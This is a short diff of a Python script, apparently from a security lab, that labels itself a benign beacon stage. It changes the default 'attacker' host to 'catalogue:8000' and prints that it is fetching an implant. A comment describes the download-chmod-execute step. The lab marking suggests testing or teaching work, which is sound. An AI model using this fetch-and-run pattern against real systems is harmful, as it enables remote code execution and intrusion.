@@ -5,7 +5,7 @@
 # executable, and launches it -- the download-then-chmod+x-then-run primitive.
 import os, urllib.request, subprocess, stat, tempfile
 
-ATTACKER = os.environ.get("LAB_ATTACKER", "attacker:8000")
+ATTACKER = os.environ.get("LAB_ATTACKER", "catalogue:8000")
 print(f"[stage4] LAB-BENIGN-BEACON remote stage running (pid {os.getpid()}), "
       f"fetching implant from {ATTACKER}", flush=True)
 
